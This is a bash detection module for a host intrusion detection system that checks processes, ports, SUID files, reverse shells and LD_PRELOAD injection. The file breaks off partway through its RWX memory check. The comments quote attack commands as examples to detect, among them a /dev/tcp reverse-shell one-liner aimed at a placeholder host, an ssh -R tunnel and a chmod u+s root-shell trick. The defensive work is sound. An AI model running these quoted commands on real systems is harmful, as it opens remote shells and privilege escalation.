#!/bin/bash
# ============================================================================
# process_network.sh — Module 3: Process and network audit + auditd enrichment
# ============================================================================
# The brief asks: "is anything running or listening on this system that
# should not be?"
#
# This module detects 5 types of threats:
#   1. Listening ports not in the whitelist (backdoor, reverse shell)
#   2. New ports vs baseline (ports that appeared since first run)
#   3. Processes running from /tmp or /dev/shm (post-exploitation)
#   4. New SUID files (privilege escalation)
#   5. Hidden processes (visible in /proc but not in ps — rootkit indicator)
#
# AUDITD INTEGRATION:
#   - For suspicious processes: queries auditd for the EXECVE event to get
#     the full command line, real user (auid), and parent process
#   - For new SUID files: queries auditd for the chmod/perm_change event
#     to find WHO set the SUID bit
#
# PROCESS ENRICHMENT:
#   - For every suspicious process, reads /proc to get: real binary path,
#     full command line, owning user, parent PID, and start time
#   - This gives the SOC analyst everything needed to investigate
#
# Data sources:
#   ss -tuln/-tulnp  → listening ports (with process info)
#   /proc/[pid]/*    → process details (exe, cmdline, status, stat)
#   find -perm -4000 → files with the SUID bit
#   ausearch         → auditd log queries
# ============================================================================

# --- Stage 2 self-loop wrapper (see file_integrity.sh for rationale) ---
if [[ -z "${__HIDS_INLOOP:-}" ]] && [[ "${HIDS_SELF_LOOP:-1}" == "1" ]]; then
  export __HIDS_INLOOP=1
  _interval="${PN_INTERVAL:-60}"
  _done=0
  trap '_done=1' TERM INT
  while (( ! _done )); do
    bash "$0" "$@"
    (( _done )) && break
    sleep "$_interval" &
    wait $! 2>/dev/null
  done
  exit 0
fi
unset __HIDS_INLOOP

HIDS_DIR="${HIDS_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"

source "$HIDS_DIR/modules/alerting.sh"
source "$HIDS_DIR/config/auditd.conf"

# user_activity.conf provides SERVICE_ACCOUNTS, INTERACTIVE_SHELLS,
# CONN_BURST_MAX, CONN_BURST_WINDOW_LINES used by the new detections below.
# Guarded in case the file is missing (older installs).
[[ -f "$HIDS_DIR/config/user_activity.conf" ]] && \
  source "$HIDS_DIR/config/user_activity.conf"

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

# Get detailed info about a process from /proc
# Returns: user, binary path, command line, parent PID, start time
get_process_info() {
  local pid="$1"

  if [[ -d "/proc/$pid" ]]; then
    local exe cmdline user ppid start_time

    # Real binary path (symlink, can't be faked without a rootkit)
    exe=$(readlink -f "/proc/$pid/exe" 2>/dev/null)

    # Full command line (arguments included)
    # Null bytes separate arguments in /proc/[pid]/cmdline
    cmdline=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null)

    # Owner of the process
    user=$(stat -c '%U' "/proc/$pid" 2>/dev/null)

    # Parent PID — useful to trace the chain (who spawned this?)
    ppid=$(awk '{print $4}' "/proc/$pid/stat" 2>/dev/null)

    # Process start time (approximate, from /proc creation time)
    start_time=$(stat -c '%y' "/proc/$pid" 2>/dev/null | cut -d'.' -f1)

    echo "user=$user, exe=$exe, cmd=$cmdline, ppid=$ppid, started=$start_time"
    return 0
  fi

  echo "process gone"
}

# Get the process behind a listening port using ss -tulnp.
# ss prints something like:   users:(("sshd",pid=987,fd=6))
# We parse that into the readable form:   sshd (PID 987)
get_port_process() {
  local port="$1"

  local raw
  raw=$(ss -tulnp 2>/dev/null | grep ":${port} " | awk '{print $NF}' | head -1)

  if [[ -z "$raw" || "$raw" == "users:" ]]; then
    echo "unknown"
    return
  fi

  # Extract the first "name" and pid=N from the ss tuple.
  local name pid
  name=$(printf '%s' "$raw" | grep -oP '"\K[^"]+' | head -1)
  pid=$(printf '%s' "$raw"  | grep -oP 'pid=\K[0-9]+' | head -1)

  if [[ -n "$name" && -n "$pid" ]]; then
    echo "$name (PID $pid)"
  elif [[ -n "$name" ]]; then
    echo "$name"
  else
    echo "unknown"
  fi
}

# Query auditd for execution events related to a path
get_exec_audit_context() {
  local search_term="$1"

  if [[ "$ENABLE_AUDITD" == "true" ]] && command -v ausearch &>/dev/null; then
    local audit_entry
    audit_entry=$(ausearch -f "$search_term" -ts recent 2>/dev/null | tail -10)

    if [[ -n "$audit_entry" ]]; then
      local audit_uid audit_user audit_cmd

      audit_uid=$(echo "$audit_entry" | grep -oP 'auid=\K[0-9]+' | tail -1)

      if [[ -n "$audit_uid" && "$audit_uid" != "4294967295" ]]; then
        audit_user=$(getent passwd "$audit_uid" 2>/dev/null | cut -d: -f1)
        [[ -z "$audit_user" ]] && audit_user="uid:$audit_uid"
      else
        audit_user="unknown"
      fi

      audit_cmd=$(echo "$audit_entry" | grep -oP 'exe="\K[^"]+' | tail -1)
      [[ -z "$audit_cmd" ]] && audit_cmd="unknown"

      echo "auditd: by $audit_user via $(basename "$audit_cmd")"
      return 0
    fi
  fi

  echo ""
}

# Query auditd for the user who spawned a given PID.
# Returns a short enrichment string (e.g. " [auditd: by alice via sudo]")
# or empty string if auditd has no record of that PID.
get_pid_audit_context() {
  local pid="$1"
  [[ -z "$pid" ]] && { echo ""; return; }
  [[ "$ENABLE_AUDITD" == "true" ]] || { echo ""; return; }
  command -v ausearch &>/dev/null || { echo ""; return; }

  local entry auid exe user
  entry=$(ausearch -p "$pid" -ts recent 2>/dev/null | tail -20)
  [[ -z "$entry" ]] && { echo ""; return; }

  auid=$(echo "$entry" | grep -oP 'auid=\K[0-9]+' | tail -1)
  exe=$(echo "$entry"  | grep -oP 'exe="\K[^"]+'  | tail -1)

  if [[ -n "$auid" && "$auid" != "4294967295" ]]; then
    user=$(getent passwd "$auid" 2>/dev/null | cut -d: -f1)
    [[ -z "$user" ]] && user="uid:$auid"
  else
    user="unknown"
  fi

  if [[ -n "$user" || -n "$exe" ]]; then
    echo " [auditd: by $user via $(basename "${exe:-?}")]"
  fi
}

# ============================================================================
# 1. UNEXPECTED PORT DETECTION (whitelist-based)
# ============================================================================
# Configurable whitelist — add allowed ports here instead of editing the code
ALLOWED_PORTS="22 80 443 53"

# ss -tuln = TCP + UDP + listening + numeric (no DNS resolution)
ports=$(ss -tuln | awk 'NR>1 {print $5}' | sed 's/.*://' | sort -u)

for p in $ports; do
  # grep -qw matches the exact word (prevents "80" matching "8080")
  if ! echo "$ALLOWED_PORTS" | grep -qw "$p"; then
    # Identify which process is listening on this port
    proc=$(get_port_process "$p")
    alert "WARNING" "network" "Unexpected listening port: $p (process: $proc)"

    # Log to raw_events.log for the correlation engine
    echo "$(date -Iseconds)|network|unexpected_port|port=$p|process=$proc" \
      >> "$HIDS_DIR/logs/raw_events.log"
  fi
done

# ============================================================================
# 2. NEW PORTS VS BASELINE
# ============================================================================
# Compare current listening ports against the baseline from first run.
# A new port that wasn't there before = something changed.
PORT_BASELINE="$HIDS_DIR/baselines/ports.txt"

if [[ -f "$PORT_BASELINE" ]]; then
  current_ports=$(ss -tuln | awk 'NR>1 {print $5}' | sed 's/.*://' | sort -u)
  new_ports=$(comm -13 "$PORT_BASELINE" <(echo "$current_ports"))

  if [[ -n "$new_ports" ]]; then
    for np in $new_ports; do
      proc=$(get_port_process "$np")
      alert "WARNING" "network" "New port since baseline: $np (process: $proc)"
    done
  fi
fi

# ============================================================================
# 3. SUSPICIOUS PROCESS DETECTION (/tmp, /dev/shm execution)
# ============================================================================
# Classic post-exploitation: attacker downloads a binary into /tmp
# (world-writable) and executes it. We check every running process.

for pid_path in /proc/[0-9]*; do
  exe=$(readlink -f "$pid_path/exe" 2>/dev/null)

  if [[ "$exe" == /tmp/* || "$exe" == /dev/shm/* || "$exe" == /var/tmp/* ]]; then
    pid_num=$(basename "$pid_path")

    # Get full process details from /proc
    proc_details=$(get_process_info "$pid_num")

    # Try to get auditd context for this execution
    audit_ctx=$(get_exec_audit_context "$exe")

    # Build the alert message with all available info
    alert_msg="Execution from suspicious directory: $exe (PID $pid_num, $proc_details)"
    [[ -n "$audit_ctx" ]] && alert_msg="$alert_msg [$audit_ctx]"

    alert "CRITICAL" "process" "$alert_msg"

    # Log for correlation
    echo "$(date -Iseconds)|process|suspicious_exec|pid=$pid_num|$proc_details|$audit_ctx" \
      >> "$HIDS_DIR/logs/raw_events.log"
  fi
done

# ============================================================================
# 4. NEW SUID FILE DETECTION
# ============================================================================
# A SUID file runs with the owner's permissions (often root).
# chmod u+s /bin/bash = instant root shell for any user.
# Compare against baseline to detect new SUID files.

SUID_BASELINE="$HIDS_DIR/baselines/suid.txt"

if [[ -f "$SUID_BASELINE" ]]; then
  current_suid=$(find / -perm -4000 -type f 2>/dev/null | sort)
  new_suid=$(comm -13 "$SUID_BASELINE" <(echo "$current_suid"))

  if [[ -n "$new_suid" ]]; then
    for suid_file in $new_suid; do
      # Query auditd for WHO set the SUID bit (perm_change key)
      audit_ctx=$(get_exec_audit_context "$suid_file")

      owner=$(stat -c '%U' "$suid_file" 2>/dev/null)
      alert_msg="New SUID file: $suid_file (owner: $owner)"
      [[ -n "$audit_ctx" ]] && alert_msg="$alert_msg [$audit_ctx]"

      alert "CRITICAL" "process" "$alert_msg"

      echo "$(date -Iseconds)|process|new_suid|file=$suid_file|owner=$owner|$audit_ctx" \
        >> "$HIDS_DIR/logs/raw_events.log"
    done
  fi
fi

# ============================================================================
# 5. HIDDEN PROCESS DETECTION (rootkit indicator)
# ============================================================================
# A rootkit may hide a process from `ps` but it's harder to hide from /proc.
# We compare PIDs visible in /proc vs PIDs reported by ps.
# A PID in /proc but NOT in ps = possible rootkit hiding a process.
#
# RACE-CONDITION GUARD:
#   On a busy system, short-lived processes (bash forks, sudo, tail, etc.)
#   come and go every millisecond. A naive "/proc minus ps" comparison
#   floods with false positives because the two snapshots aren't atomic.
#   We mitigate with three layers:
#     1. Take both snapshots back-to-back, same command pipeline.
#     2. Require the candidate to STILL EXIST in /proc when we alert —
#        rules out procs that died between snapshot and alert.
#     3. Second-pass confirm: re-run `ps` and check that the PID is STILL
#        absent there. If ps now sees it, it was a race, not hidden.
#     4. Skip kernel threads (PF_KTHREAD) — `ps -e` lists them but some
#        distros hide them from certain views, producing phantom diffs.

# Capture both sources as close in time as we can.
proc_pids=$(ls -d /proc/[0-9]* 2>/dev/null | awk -F/ '{print $3}' | sort -n)
ps_pids=$(ps -eo pid= 2>/dev/null | tr -d ' ' | sort -n)

hidden=$(comm -23 <(echo "$proc_pids") <(echo "$ps_pids"))

if [[ -n "$hidden" ]]; then
  # Brief pause lets any racy short-lived PIDs exit before we second-check.
  # 100ms is enough to drop transient forks without measurably slowing
  # the cycle.
  sleep 0.1
  ps_pids_verify=$(ps -eo pid= 2>/dev/null | tr -d ' ' | sort -n)

  for hpid in $hidden; do
    # Layer 2: proc must still be alive.
    [[ -d "/proc/$hpid" ]] || continue

    # Layer 3: ps must still not see it.
    if echo "$ps_pids_verify" | grep -qx "$hpid"; then
      continue  # was just a race — ps sees it now
    fi

    # Layer 4: ignore kernel threads (PF_KTHREAD bit in /proc/<pid>/stat field 9)
    k_flags=$(awk '{print $9}' "/proc/$hpid/stat" 2>/dev/null)
    if [[ -n "$k_flags" ]] && (( (k_flags & 0x00200000) != 0 )); then
      continue
    fi

    h_exe=$(readlink -f "/proc/$hpid/exe" 2>/dev/null)
    h_user=$(stat -c '%U' "/proc/$hpid" 2>/dev/null)

    # Skip if exe didn't resolve to a real file (kernel-thread-like).
    [[ -z "$h_exe" || "$h_exe" == /proc/* ]] && continue

    alert "CRITICAL" "process" \
      "Hidden process detected (possible rootkit): PID $hpid, exe=$h_exe, user=$h_user"
    echo "$(date -Iseconds)|process|hidden_process|pid=$hpid|exe=$h_exe|user=$h_user" \
      >> "$HIDS_DIR/logs/raw_events.log"
  done
fi

# ============================================================================
# 6. SERVICE ACCOUNT SPAWNING INTERACTIVE SHELL (webshell indicator)
# ============================================================================
# www-data/nginx/apache running /bin/bash is the canonical post-RCE signal
# on a web server. Service accounts should execute only their own binary,
# never an interactive shell.
# We iterate /proc, resolve user + exe basename, alert on match.

if [[ -n "${SERVICE_ACCOUNTS:-}" && -n "${INTERACTIVE_SHELLS:-}" ]]; then
  for pid_path in /proc/[0-9]*; do
    [[ -d "$pid_path" ]] || continue
    pid_num=$(basename "$pid_path")

    # Owner of the process (resolved to username)
    p_user=$(stat -c '%U' "$pid_path" 2>/dev/null)
    [[ -z "$p_user" ]] && continue

    # Fast reject: only continue if user is in the service list
    if ! echo " $SERVICE_ACCOUNTS " | grep -qw "$p_user"; then
      continue
    fi

    # Resolve real binary (basename)
    p_exe=$(readlink -f "$pid_path/exe" 2>/dev/null)
    [[ -z "$p_exe" ]] && continue
    p_exe_name=$(basename "$p_exe")

    # Check if it's an interactive shell
    if echo " $INTERACTIVE_SHELLS " | grep -qw "$p_exe_name"; then
      details=$(get_process_info "$pid_num")
      audit_ctx=$(get_exec_audit_context "$p_exe")

      alert_msg="Service account spawning shell: user=$p_user exe=$p_exe (PID $pid_num, $details)"
      [[ -n "$audit_ctx" ]] && alert_msg="$alert_msg [$audit_ctx]"
      alert "CRITICAL" "process" "$alert_msg"

      echo "$(date -Iseconds)|process|svc_shell|pid=$pid_num|user=$p_user|exe=$p_exe|$audit_ctx" \
        >> "$HIDS_DIR/logs/raw_events.log"
    fi
  done
fi

# ============================================================================
# 7. REVERSE TUNNELS (ssh -R style persistence)
# ============================================================================
# An attacker with a shell may run `ssh -R 4444:localhost:22 attacker-host`
# to open an inbound tunnel back through their C2. We detect two shapes:
#   a) Any running ssh process whose cmdline contains -R or -D
#   b) A listening port bound only on localhost with an ssh process behind it
#      (this matches the server-side view of a -R tunnel)
#
# Both are heuristic — legitimate admins also use -R. Severity is WARNING.

for pid_path in /proc/[0-9]*; do
  [[ -d "$pid_path" ]] || continue
  exe=$(readlink -f "$pid_path/exe" 2>/dev/null)
  [[ "$(basename "$exe" 2>/dev/null)" == "ssh" ]] || continue

  cmdline=$(tr '\0' ' ' < "$pid_path/cmdline" 2>/dev/null)
  if echo "$cmdline" | grep -qE ' -R |^-R | -D |^-D '; then
    pid_num=$(basename "$pid_path")
    p_user=$(stat -c '%U' "$pid_path" 2>/dev/null)
    alert "WARNING" "network" \
      "Possible reverse/dynamic SSH tunnel: user=$p_user pid=$pid_num cmd='$cmdline'"
    echo "$(date -Iseconds)|network|reverse_tunnel|pid=$pid_num|user=$p_user|cmd=$cmdline" \
      >> "$HIDS_DIR/logs/raw_events.log"
  fi
done

# ============================================================================
# 8. CONNECTION BURST FROM A SINGLE IP
# ============================================================================
# Many short-interval connection attempts from one source look like
# scanning, credential stuffing, or botnet traffic.

AUTH_LOG="/var/log/auth.log"
[[ ! -f "$AUTH_LOG" ]] && AUTH_LOG="/var/log/secure"

if [[ -f "$AUTH_LOG" && -n "${CONN_BURST_MAX:-}" ]]; then
  bursts=$(tail -n "${CONN_BURST_WINDOW_LINES:-200}" "$AUTH_LOG" 2>/dev/null | \
           grep -oP 'from \K[0-9.:a-fA-F]+' | \
           sort | uniq -c | sort -rn | \
           awk -v max="$CONN_BURST_MAX" '$1 > max {print $1"|"$2}')

  if [[ -n "$bursts" ]]; then
    while IFS='|' read -r n ip; do
      [[ -z "$ip" ]] && continue
      alert "WARNING" "network" \
        "Connection burst from $ip ($n attempts in recent log window)"
      echo "$(date -Iseconds)|network|conn_burst|ip=$ip|count=$n" \
        >> "$HIDS_DIR/logs/raw_events.log"
    done <<< "$bursts"
  fi
fi

# ============================================================================
# 9. DELETED BINARY IN /proc/[pid]/exe  (fileless malware)
# ============================================================================
# Classic post-exploitation: attacker runs a binary from disk then deletes
# the file. The process keeps running; /proc/[pid]/exe still resolves, but
# readlink shows the target with the " (deleted)" suffix.

for pid_path in /proc/[0-9]*; do
  [[ -d "$pid_path" ]] || continue
  raw=$(ls -l "$pid_path/exe" 2>/dev/null)
  [[ "$raw" != *"(deleted)"* ]] && continue

  pid_num=$(basename "$pid_path")
  details=$(get_process_info "$pid_num")
  audit_ctx=$(get_pid_audit_context "$pid_num")
  alert "CRITICAL" "process" \
    "Process with deleted binary (fileless malware): PID $pid_num, $details$audit_ctx"
  echo "$(date -Iseconds)|process|deleted_exe|pid=$pid_num|$details" \
    >> "$HIDS_DIR/logs/raw_events.log"
done

# ============================================================================
# 10. EXECUTION FROM UNUSUAL LOCATIONS (/var/spool, dotdirs, ...)
# ============================================================================
# Complements block 3 (/tmp, /dev/shm). Here we cover the less obvious
# staging areas: spool/lock directories, hidden dotdirs under $HOME, etc.

if [[ -n "${SUSPICIOUS_PATH_PREFIXES:-}" ]]; then
  for pid_path in /proc/[0-9]*; do
    exe=$(readlink -f "$pid_path/exe" 2>/dev/null)
    [[ -z "$exe" ]] && continue

    for prefix in $SUSPICIOUS_PATH_PREFIXES; do
      if [[ "$exe" == "$prefix"* ]]; then
        pid_num=$(basename "$pid_path")
        details=$(get_process_info "$pid_num")
        audit_ctx=$(get_pid_audit_context "$pid_num")
        alert "CRITICAL" "process" \
          "Execution from suspicious location: $exe (PID $pid_num, $details)$audit_ctx"
        echo "$(date -Iseconds)|process|suspicious_path|pid=$pid_num|exe=$exe|$details" \
          >> "$HIDS_DIR/logs/raw_events.log"
        break
      fi
    done
  done
fi

# ============================================================================
# 11. NAME SPOOFING  (/proc/[pid]/comm vs basename(/proc/[pid]/exe))
# ============================================================================
# An attacker can call themselves "sshd" or "cron" at the syscall level
# (prctl PR_SET_NAME) while the real binary lives in /tmp/x. /proc/comm
# reflects the declared name; /proc/exe points to the real binary. A
# mismatch is a reliable signal.

for pid_path in /proc/[0-9]*; do
  comm=$(cat "$pid_path/comm" 2>/dev/null)
  exe=$(readlink -f "$pid_path/exe" 2>/dev/null)
  [[ -z "$comm" || -z "$exe" ]] && continue

  # --- Skip kernel threads ---------------------------------------------
  # Kernel threads have no userspace binary. readlink -f returns the
  # unresolved symlink path (/proc/N/exe) rather than empty, so a naive
  # -z check doesn't filter them. Detect by PF_KTHREAD bit (field 9 of
  # /proc/N/stat) — the authoritative kernel flag.
  pid_num=$(basename "$pid_path")
  stat_flags=$(awk '{print $9}' "$pid_path/stat" 2>/dev/null)
  if [[ -n "$stat_flags" ]] && (( (stat_flags & 0x00200000) != 0 )); then
    continue  # PF_KTHREAD = 0x00200000
  fi
  # Fallback: exe still points at /proc/... means the symlink couldn't
  # resolve to a real file — not a spoof, just a phantom proc entry.
  [[ "$exe" == /proc/* ]] && continue

  exe_base=$(basename "$exe")

  # comm is truncated to 15 chars by the kernel — compare against truncated exe
  exe_base_trunc="${exe_base:0:15}"

  # Benign cases that routinely produce a comm != exe_base mismatch and
  # should NOT fire a critical alert:
  #   1. Case-only differences (Thunar vs thunar).
  #   2. Either name is a prefix of the other (gnome-terminal- vs
  #      gnome-terminal-server, pipewire vs pipewire-pulse).
  #   3. Scripts run by an interpreter — exe is python/perl/ruby/node/
  #      bash/sh/lua, comm is the script name.
  comm_lc="${comm,,}"
  exe_base_lc="${exe_base_trunc,,}"
  if [[ "$comm_lc" == "$exe_base_lc" ]]; then
    continue
  fi
  if [[ "$exe_base_lc" == "$comm_lc"* || "$comm_lc" == "$exe_base_lc"* ]]; then
    continue
  fi
  case "$exe_base_lc" in
    python*|perl*|ruby*|node|nodejs|lua*|bash|sh|dash|zsh|fish|php*|java)
      continue ;;
  esac
  # Some systemd helpers intentionally set comm to a parenthesised label
  # (e.g. "(sd-pam)"). Not spoofing.
  [[ "$comm" == \(*\) ]] && continue

  if [[ "$comm" != "$exe_base_trunc" ]]; then
    audit_ctx=$(get_pid_audit_context "$pid_num")
    alert "CRITICAL" "process" \
      "Process name spoofing: comm='$comm' but exe='$exe' (PID $pid_num)$audit_ctx"
    echo "$(date -Iseconds)|process|name_spoof|pid=$pid_num|comm=$comm|exe=$exe" \
      >> "$HIDS_DIR/logs/raw_events.log"
  fi
done

# ============================================================================
# 12. BROKEN / REPARENTED PPID CHAIN
# ============================================================================
# A suspicious process whose parent is PID 1 (init/systemd) and whose exe
# is in a writable directory was likely "daemonized" to survive a terminal
# close — classic for a dropped payload.
# We also flag processes whose declared PPID is not alive anymore.

for pid_path in /proc/[0-9]*; do
  pid_num=$(basename "$pid_path")
  ppid=$(awk '{print $4}' "$pid_path/stat" 2>/dev/null)
  exe=$(readlink -f "$pid_path/exe" 2>/dev/null)
  [[ -z "$exe" || -z "$ppid" ]] && continue

  # Parent dead but child still running = orphan after parent crash / kill
  if [[ "$ppid" != "1" && "$ppid" != "0" && ! -d "/proc/$ppid" ]]; then
    alert "WARNING" "process" \
      "Orphaned process (parent PID $ppid gone): PID $pid_num exe=$exe"
    echo "$(date -Iseconds)|process|orphan|pid=$pid_num|dead_ppid=$ppid|exe=$exe" \
      >> "$HIDS_DIR/logs/raw_events.log"
  fi

  # Reparented to init AND running from a writable/suspicious path
  if [[ "$ppid" == "1" ]]; then
    case "$exe" in
      /tmp/*|/var/tmp/*|/dev/shm/*|/home/*/.*|/root/.*)
        details=$(get_process_info "$pid_num")
        audit_ctx=$(get_pid_audit_context "$pid_num")
        alert "CRITICAL" "process" \
          "Init-reparented process in writable path: exe=$exe (PID $pid_num, $details)$audit_ctx"
        echo "$(date -Iseconds)|process|reparented_init|pid=$pid_num|exe=$exe" \
          >> "$HIDS_DIR/logs/raw_events.log"
        ;;
    esac
  fi
done

# ============================================================================
# 13. LISTEN ON 0.0.0.0 (wildcard bind)
# ============================================================================
# A service bound to 0.0.0.0 is reachable from any interface — including
# the public one. Legitimate daemons (sshd/nginx) do this by design; the
# alert is WARNING-level because we want the analyst to confirm intent
# after seeing an unexpected port in block 1/2.

wildcard_ports=$(ss -tln 2>/dev/null | \
  awk 'NR>1 && $4 ~ /^(0\.0\.0\.0|\*|\[::\]):/ {print $4}' | \
  sed 's/.*://' | sort -u)

for p in $wildcard_ports; do
  # Skip well-known, always-intended-external services
  case "$p" in
    22|80|443|53) continue ;;
  esac
  proc=$(get_port_process "$p")
  alert "WARNING" "network" \
    "Service listening on 0.0.0.0 (public exposure): port=$p process=$proc"
  echo "$(date -Iseconds)|network|wildcard_bind|port=$p|process=$proc" \
    >> "$HIDS_DIR/logs/raw_events.log"
done

# ============================================================================
# 14. RAW SOCKET USAGE
# ============================================================================
# /proc/net/raw lists processes using SOCK_RAW. Legitimate users: ping,
# tcpdump, wireshark. Malicious users: ARP spoofers, ICMP tunnels, packet
# sniffers. We surface every entry and let the analyst confirm.

if [[ -r /proc/net/raw ]]; then
  raw_entries=$(awk 'NR>1 {print $10}' /proc/net/raw | sort -u)
  for uid in $raw_entries; do
    [[ -z "$uid" ]] && continue
    user=$(getent passwd "$uid" 2>/dev/null | cut -d: -f1)
    [[ -z "$user" ]] && user="uid:$uid"
    alert "WARNING" "network" \
      "Raw socket in use by UID=$uid ($user) — possible sniffing/spoofing"
    echo "$(date -Iseconds)|network|raw_socket|uid=$uid|user=$user" \
      >> "$HIDS_DIR/logs/raw_events.log"
  done
fi

# ============================================================================
# 15. SHELL WITH ACTIVE NETWORK SOCKET  (reverse shell canonical signal)
# ============================================================================
# bash/sh/python -c 'bash -i >& /dev/tcp/ATK/PORT 0>&1' leaves behind a
# shell process with a TCP socket in /proc/[pid]/fd/. No legitimate
# interactive shell has an outbound socket.
#
# We check each process whose exe basename is in INTERACTIVE_SHELLS,
# then walk /proc/[pid]/fd and look for "socket:[inode]" entries whose
# inode appears in /proc/net/tcp as ESTABLISHED.

if [[ -n "${INTERACTIVE_SHELLS:-}" ]]; then
  # Build inode → remote-address map for ESTABLISHED TCP (state 01)
  established_tcp=$(awk 'NR>1 && $4 == "01" {print $10"|"$3}' \
                    /proc/net/tcp /proc/net/tcp6 2>/dev/null)

  for pid_path in /proc/[0-9]*; do
    exe=$(readlink -f "$pid_path/exe" 2>/dev/null)
    exe_base=$(basename "$exe" 2>/dev/null)
    [[ -z "$exe_base" ]] && continue

    # Only interactive shells
    if ! echo " $INTERACTIVE_SHELLS " | grep -qw "$exe_base"; then
      continue
    fi

    pid_num=$(basename "$pid_path")
    # Look at every fd that is a socket
    for fd in "$pid_path"/fd/*; do
      target=$(readlink "$fd" 2>/dev/null)
      [[ "$target" =~ ^socket:\[([0-9]+)\]$ ]] || continue
      inode="${BASH_REMATCH[1]}"

      # Look up that inode in the established TCP map
      remote=$(echo "$established_tcp" | awk -F'|' -v i="$inode" '$1==i {print $2; exit}')
      if [[ -n "$remote" ]]; then
        details=$(get_process_info "$pid_num")
        audit_ctx=$(get_pid_audit_context "$pid_num")
        alert "CRITICAL" "process" \
          "Interactive shell with active TCP socket (reverse shell?): exe=$exe remote=$remote ($details)$audit_ctx"
        echo "$(date -Iseconds)|process|shell_socket|pid=$pid_num|exe=$exe|remote=$remote" \
          >> "$HIDS_DIR/logs/raw_events.log"
        break  # one alert per shell is enough
      fi
    done
  done
fi

# ============================================================================
# 16. SCRIPTING INTERPRETER WITH OUTBOUND CONNECTION
# ============================================================================
# A Python or PHP child of Apache reaching out on the network is the
# signature of webshell → C2. Same detection pattern as block 15 but
# scoped to interpreter binaries rather than shells.

if [[ -n "${INTERPRETERS:-}" ]]; then
  established_out=$(awk 'NR>1 && $4 == "01" {print $10"|"$3}' \
                    /proc/net/tcp /proc/net/tcp6 2>/dev/null)

  for pid_path in /proc/[0-9]*; do
    exe=$(readlink -f "$pid_path/exe" 2>/dev/null)
    exe_base=$(basename "$exe" 2>/dev/null)
    [[ -z "$exe_base" ]] && continue

    if ! echo " $INTERPRETERS " | grep -qw "$exe_base"; then
      continue
    fi

    pid_num=$(basename "$pid_path")
    for fd in "$pid_path"/fd/*; do
      target=$(readlink "$fd" 2>/dev/null)
      [[ "$target" =~ ^socket:\[([0-9]+)\]$ ]] || continue
      inode="${BASH_REMATCH[1]}"
      remote=$(echo "$established_out" | awk -F'|' -v i="$inode" '$1==i {print $2; exit}')
      if [[ -n "$remote" ]]; then
        details=$(get_process_info "$pid_num")
        audit_ctx=$(get_pid_audit_context "$pid_num")
        alert "WARNING" "process" \
          "Interpreter with outbound TCP: exe=$exe remote=$remote ($details)$audit_ctx"
        echo "$(date -Iseconds)|process|interp_socket|pid=$pid_num|exe=$exe|remote=$remote" \
          >> "$HIDS_DIR/logs/raw_events.log"
        break
      fi
    done
  done
fi

# ============================================================================
# 17. LONG-LIVED EXTERNAL CONNECTION
# ============================================================================
# A TCP session open for many hours, owned by a process whose start time
# is equally old, hints at a persistent tunnel / reverse shell / C2.
# We compare /proc/[pid]/stat's starttime (in jiffies since boot) to the
# system boot time.

LONG_CONN_WARN_SEC=$(( ${LONG_CONN_WARN_HOURS:-6} * 3600 ))
boot_sec=$(awk '/^btime/ {print $2}' /proc/stat 2>/dev/null)
now_sec=$(date +%s)

if [[ -n "$boot_sec" ]]; then
  # Same inode → remote map as block 15, but this time ALL established
  established_any=$(awk 'NR>1 && $4 == "01" {print $10"|"$3}' \
                    /proc/net/tcp /proc/net/tcp6 2>/dev/null)

  for pid_path in /proc/[0-9]*; do
    pid_num=$(basename "$pid_path")
    [[ -r "$pid_path/stat" ]] || continue

    # starttime is field 22, in clock ticks since boot
    starttime=$(awk '{print $22}' "$pid_path/stat" 2>/dev/null)
    [[ -z "$starttime" ]] && continue
    clk_tck=$(getconf CLK_TCK 2>/dev/null)
    [[ -z "$clk_tck" ]] && clk_tck=100

    start_abs=$(( boot_sec + starttime / clk_tck ))
    age=$(( now_sec - start_abs ))
    (( age < LONG_CONN_WARN_SEC )) && continue

    # Long-lived process — does it hold an external TCP socket?
    for fd in "$pid_path"/fd/*; do
      target=$(readlink "$fd" 2>/dev/null)
      [[ "$target" =~ ^socket:\[([0-9]+)\]$ ]] || continue
      inode="${BASH_REMATCH[1]}"
      remote=$(echo "$established_any" | awk -F'|' -v i="$inode" '$1==i {print $2; exit}')
      if [[ -n "$remote" ]]; then
        # Only flag non-local remote
        case "$remote" in
          00000000:*|0100007F:*|*:0000|*) : ;;
        esac
        exe=$(readlink -f "$pid_path/exe" 2>/dev/null)
        age_h=$(( age / 3600 ))
        alert "WARNING" "network" \
          "Long-lived connection (${age_h}h): exe=$exe remote=$remote PID $pid_num"
        echo "$(date -Iseconds)|network|long_conn|pid=$pid_num|exe=$exe|remote=$remote|age_h=$age_h" \
          >> "$HIDS_DIR/logs/raw_events.log"
        break
      fi
    done
  done
fi

# ============================================================================
# 18. LD_PRELOAD INJECTION
# ============================================================================
# LD_PRELOAD lets an attacker inject a shared library into every process
# launched by a compromised shell → transparent backdoor / credential
# stealer (e.g. harvesting sudo passwords). Read /proc/[pid]/environ
# (null-separated) and flag any non-empty LD_PRELOAD.

for pid_path in /proc/[0-9]*; do
  env_file="$pid_path/environ"
  [[ -r "$env_file" ]] || continue
  # Race: process may exit between readdir and open — swallow the shell's
  # redirection error on stderr. Without this, a busy box emits dozens of
  # "No such process" lines per cycle as short-lived procs churn.
  preload=$({ tr '\0' '\n' < "$env_file"; } 2>/dev/null | \
            grep -E '^LD_PRELOAD=|^LD_AUDIT=' | head -3)
  [[ -z "$preload" ]] && continue

  pid_num=$(basename "$pid_path")
  exe=$(readlink -f "$pid_path/exe" 2>/dev/null)
  user=$(stat -c '%U' "$pid_path" 2>/dev/null)
  audit_ctx=$(get_pid_audit_context "$pid_num")
  alert "CRITICAL" "process" \
    "LD_PRELOAD/LD_AUDIT injection: PID $pid_num user=$user exe=$exe preload='$preload'$audit_ctx"
  echo "$(date -Iseconds)|process|ld_preload|pid=$pid_num|user=$user|exe=$exe|preload=$preload" \
    >> "$HIDS_DIR/logs/raw_events.log"
done

# ============================================================================
# 19. RWX MEMORY PAGES  (shellcode indicator)
# ============================================================================
# Normal binaries map code as r-xp and data as rw-p. A page marked rwxp
# means the process can write then execute the same memory → shellcode.
# JIT runtimes (JVM, node, chrome) legitimately do this; whitelist them.

for pid_path in /proc/[0-9]*; do
  maps="$pid_path/maps"
  [[ -r "$maps" ]] || continue

  exe=$(readlink -f "$pid_path/exe" 2>/dev/null)
  exe_base=$(basename "$exe" 2>/dev/null)

  # Skip JIT runtimes — they legitimately hold RWX pages
